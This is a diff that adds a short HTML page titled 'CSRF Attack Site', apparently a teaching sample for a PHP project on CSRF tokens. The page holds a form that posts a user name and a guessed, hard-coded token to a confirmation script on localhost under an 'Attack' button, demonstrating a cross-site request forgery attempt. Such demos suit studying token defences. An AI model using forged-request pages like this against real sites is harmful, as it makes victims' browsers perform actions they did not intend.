@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html lang="ja">
+
+<head>
+  <meta charset="utf-8">
+  <title>CSRF Attack Site</title>
+  <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css">
+</head>
+
+<body>
+  <div class="container">
+    <h2 class="h2">CSRF Attack Site</h2>
+    <form action="http://localhost/php_samples/token/confirm.php" method="post">
+      <input class="form-control" type="text" value="" name="user_name">
+      <input class="form-control" type="hidden" value="abcdefg123456" name="csrf_token">
+      <button class="btn btn-danger">Attack</button>
+    </form>
+  </div>
+</body>
+
+</html>
